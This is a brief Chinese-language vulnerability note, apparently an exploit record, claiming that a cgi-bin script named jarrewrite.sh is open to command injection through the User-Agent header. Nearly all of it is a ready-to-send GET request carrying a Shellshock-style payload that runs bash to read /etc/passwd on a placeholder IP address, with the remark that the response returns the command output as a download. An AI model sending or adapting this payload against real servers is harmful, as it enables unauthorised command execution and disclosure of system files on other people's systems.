这个文件存在命令注入漏洞，漏洞触发在 Usage-Agent

发送如下请求即可命令执行

发送请求会下载一个文件，文件内容为命令执行的结果

GET https://xxx.xxx.xxx.xxx/cgi-bin/jarrewrite.shUser-Agent: () { :; }; echo ; /bin/bash -c 'cat /etc/passwd'
